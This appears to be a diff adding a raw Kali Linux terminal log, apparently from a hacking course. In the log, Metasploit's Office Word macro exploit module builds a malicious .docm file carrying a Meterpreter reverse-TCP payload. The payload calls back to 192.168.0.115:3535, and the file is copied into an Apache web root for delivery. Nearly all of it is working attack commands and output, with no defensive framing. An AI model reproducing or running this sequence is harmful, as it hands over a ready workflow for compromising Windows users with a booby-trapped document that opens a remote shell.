@@ -1,0 +1,136 @@
+root@kali:~# msfconsole -q
+msf5 > search office_word
+
+Matching Modules
+================
+
+   #  Name                                        Disclosure Date  Rank       Check  Description
+   -  ----                                        ---------------  ----       -----  -----------
+   0  exploit/multi/fileformat/office_word_macro  2012-01-10       excellent  No     Microsoft Office Word Malicious Macro Execution
+   1  exploit/windows/fileformat/office_word_hta  2017-04-14       excellent  No     Microsoft Office Word Malicious Hta Execution
+
+
+msf5 > use exploit/multi/fileformat/office_word_macro
+msf5 exploit(multi/fileformat/office_word_macro) > show options
+
+Module options (exploit/multi/fileformat/office_word_macro):
+
+   Name            Current Setting  Required  Description
+   ----            ---------------  --------  -----------
+   CUSTOMTEMPLATE                   no        A docx file that will be used as a template to build the exploit
+   FILENAME        msf.docm         yes       The Office document macro file (docm)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Microsoft Office Word on Windows
+
+
+msf5 exploit(multi/fileformat/office_word_macro) > set FILENAME Hacking_HackersSchool.docm
+FILENAME => Hacking_HackersSchool.docm
+msf5 exploit(multi/fileformat/office_word_macro) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf5 exploit(multi/fileformat/office_word_macro) > show options
+
+Module options (exploit/multi/fileformat/office_word_macro):
+
+   Name            Current Setting             Required  Description
+   ----            ---------------             --------  -----------
+   CUSTOMTEMPLATE                              no        A docx file that will be used as a template to build the exploit
+   FILENAME        Hacking_HackersSchool.docm  yes       The Office document macro file (docm)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+   **DisablePayloadHandler: True   (RHOST and RPORT settings will be ignored!)**
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Microsoft Office Word on Windows
+
+
+msf5 exploit(multi/fileformat/office_word_macro) > set LHOST 192.168.0.115
+LHOST => 192.168.0.115
+msf5 exploit(multi/fileformat/office_word_macro) > set LPORT 3535
+LPORT => 3535
+msf5 exploit(multi/fileformat/office_word_macro) > show options
+
+Module options (exploit/multi/fileformat/office_word_macro):
+
+   Name            Current Setting             Required  Description
+   ----            ---------------             --------  -----------
+   CUSTOMTEMPLATE                              no        A docx file that will be used as a template to build the exploit
+   FILENAME        Hacking_HackersSchool.docm  yes       The Office document macro file (docm)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.0.115    yes       The listen address (an interface may be specified)
+   LPORT     3535             yes       The listen port
+
+   **DisablePayloadHandler: True   (RHOST and RPORT settings will be ignored!)**
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Microsoft Office Word on Windows
+
+
+msf5 exploit(multi/fileformat/office_word_macro) > exploit
+
+[*] Using template: /usr/share/metasploit-framework/data/exploits/office_word_macro/template.docx
+[*] Injecting payload in document comments
+[*] Injecting macro and other required files in document
+[*] Finalizing docm: Hacking_HackersSchool.docm
+[+] Hacking_HackersSchool.docm stored at /root/.msf4/local/Hacking_HackersSchool.docm
+msf5 exploit(multi/fileformat/office_word_macro) > exit
+root@kali:~# cp /root/.msf4/local/Hacking_HackersSchool.docm /var/www/html/
+root@kali:~# service http start
+Failed to start http.service: Unit http.service not found.
+root@kali:~# service httdp start
+Failed to start httdp.service: Unit httdp.service not found.
+root@kali:~# service httpd start
+Failed to start httpd.service: Unit httpd.service not found.
+root@kali:~# service apache2 start
+root@kali:~# service apache2 status
+● apache2.service - The Apache HTTP Server
+   Loaded: loaded (/lib/systemd/system/apache2.service; disabled; vendor preset: disabled)
+   Active: active (running) since Tue 2019-07-16 10:28:35 IST; 10s ago
+     Docs: https://httpd.apache.org/docs/2.4/
+  Process: 2865 ExecStart=/usr/sbin/apachectl start (code=exited, status=0/SUCCESS)
+ Main PID: 2876 (apache2)
+    Tasks: 7 (limit: 4535)
+   Memory: 22.0M
+   CGroup: /system.slice/apache2.service
+           ├─2876 /usr/sbin/apache2 -k start
+           ├─2877 /usr/sbin/apache2 -k start
+           ├─2878 /usr/sbin/apache2 -k start
+           ├─2879 /usr/sbin/apache2 -k start
+           ├─2880 /usr/sbin/apache2 -k start
+           ├─2881 /usr/sbin/apache2 -k start
+           └─2882 /usr/sbin/apache2 -k start
+
+Jul 16 10:28:33 kali systemd[1]: Starting The Apache HTTP Server...
+Jul 16 10:28:35 kali apachectl[2865]: AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1. Set th
+Jul 16 10:28:35 kali systemd[1]: Started The Apache HTTP Server.
+
+root@kali:~# 
+
+
+
